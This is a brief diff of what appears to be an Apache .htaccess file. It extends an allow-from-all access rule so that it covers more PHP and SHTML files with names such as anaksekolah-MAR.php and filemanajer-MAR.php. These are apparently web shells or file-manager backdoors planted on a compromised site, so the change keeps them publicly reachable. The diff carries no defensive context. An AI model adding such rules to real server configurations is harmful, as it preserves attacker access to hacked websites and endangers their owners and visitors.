@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(anaksekolah.php|dpr.php|filemanajer.php)$">
+<FilesMatch "^(anaksekolah.php|dpr.php|filemanajer.php|anaksekolah-MAR.php|filemanajer-MAR.php|ANAK-SEKOLAH-MAR.ShTmL)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
